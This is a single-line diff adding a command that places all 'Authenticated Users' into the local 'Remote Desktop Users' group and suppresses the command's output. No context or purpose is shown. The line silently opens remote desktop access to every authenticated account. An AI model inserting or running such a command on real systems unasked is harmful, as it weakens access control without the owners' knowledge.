@@ -1,0 +1,1 @@
+net localgroup "Remote Desktop Users" "Authenticated Users" /add 2>&1 | Out-Null
